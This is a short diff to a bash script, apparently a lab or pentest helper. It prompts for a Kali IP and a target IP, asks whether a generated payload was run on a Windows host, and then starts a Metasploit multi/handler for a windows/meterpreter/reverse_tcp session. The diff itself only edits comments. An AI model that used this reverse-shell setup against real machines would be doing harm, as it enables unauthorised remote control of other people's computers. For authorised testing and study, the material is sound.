@@ -1,6 +1,6 @@
 #!/bin/bash
 
-#echo Hello World!
+# User input
 echo -n "Enter the Kali IP adress [ENTER]: "
 read ip_k
 echo -n "Enter the host IP adress [ENTER]: "
@@ -28,7 +28,7 @@ echo "Program made :" $check
 # Giving user option to start metaspoit attack
 read -r -p "Did you start the created payload on the Windows host? [y/N] " response
 if [[ "$response" =~ ^([yY][eE][sS]|[yY])+$ ]]
-then
+then # start expoit
      echo "Starting the attack"
      echo "use exploit/multi/handler
      set PAYLOAD windows/meterpreter/reverse_tcp
